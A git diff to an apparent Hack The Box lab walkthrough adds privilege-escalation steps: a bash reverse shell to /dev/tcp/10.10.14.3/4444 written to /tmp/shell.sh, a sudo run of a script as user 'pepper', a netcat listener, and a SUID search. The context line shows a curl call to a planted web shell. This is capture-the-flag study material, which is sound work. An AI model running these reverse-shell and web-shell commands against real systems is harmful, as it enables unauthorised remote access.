@@ -81,7 +81,24 @@ curl -X POST http://10.10.10.143/pwned.php --data-urlencode 'exec=bash -c "bash 
 ![image](https://github.com/regarmulia/HTB/assets/33616880/ad41ebca-08db-4c49-ab26-25955092ca08)
 
 
+```
+sudo -l
+```
+![image](https://github.com/regarmulia/HTB/assets/33616880/04e0ed8e-6136-4ade-bbda-432ac36ccb07)
 
+
+```
+echo 'bash -c "bash -i >& /dev/tcp/10.10.14.3/4444 0>&1"' > /tmp/shell.sh
+sudo -u pepper /var/www/Admin-Utilities/simpler.py –p
+nc -nlvp 4444
+```
+![image](https://github.com/regarmulia/HTB/assets/33616880/58d9e518-fc9b-448b-8017-e562b141876b)
+
+
+```
+find / -perm -4000 2>/dev/null
+```
+![image](https://github.com/regarmulia/HTB/assets/33616880/5cef9fdc-3e1c-4ae1-b0a2-b2382661c442)
 
 
 ```
